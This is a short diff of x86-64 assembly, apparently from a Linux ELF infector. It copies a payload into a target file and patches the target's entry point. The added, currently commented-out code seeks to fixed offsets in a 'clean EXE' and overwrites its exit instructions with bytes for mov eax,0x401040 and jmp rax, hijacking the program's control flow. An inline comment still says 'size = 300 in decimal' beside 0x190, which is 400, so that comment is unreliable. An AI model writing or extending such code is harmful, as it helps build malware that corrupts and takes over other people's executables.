@@ -67,7 +67,7 @@ _start:
 	mov	rdi,	r12
 	mov	rsi,	r13
 	mov	rdx,	0x0
-	mov	r10,	0x12C 	; size = 300 in decimal
+	mov	r10,	0x190 	; size = 300 in decimal
 	syscall
 
        ; lseek offset to entry point address
@@ -97,7 +97,36 @@ _start:
 	mov	rdx,	4
 	syscall
 
- 
+	; lseek offset to exit instructions
+;        mov	rdi,	r12	; fd
+;        mov	rax,	SYS_LSEEK ;sys call
+;        mov	rsi,	0x12cc;0x12cc	; offset
+;        mov	rdx,	0	; Origin
+;        syscall
+;
+;	
+;	
+;       ; Change jump clean EXE
+;        mov	rax,	SYS_WRITE
+;        mov	rdi,	r12
+;        mov	rsi,	movEntry
+;        mov	rdx,	5
+;        syscall
+;
+;	 ; lseek offset to exit instructions
+;        mov	rdi,	r12	; fd
+;        mov	rax,	SYS_LSEEK ;sys call
+;        mov	rsi,	0x12d1	;0x12d1	; offset FIRST OFFSET OF EXIT
+;        mov	rdx,	0	; Origin
+;        syscall
+;
+;	; Change ret clean EXE
+;        mov	rax,	SYS_WRITE
+;        mov	rdi,	r12
+;        mov	rsi,	jumpEntry
+;        mov	rdx,	2
+;        syscall
+
         ; CLOSE ALL FILES
         mov	rax,	SYS_CLOSE
         mov	rdi,	r12
@@ -106,10 +135,15 @@ _start:
  	mov	rax,	SYS_CLOSE
  	mov	rdi,	r13
  	syscall
- 
+
  	mov	rax,	SYS_EXIT
  	mov	rdi,	0
  	syscall
+
+	movEntry dq 0x401040b8
+	;jumpEntry dq 0x68401040
+	jumpEntry dd 0xe0ff
+
 
 
 
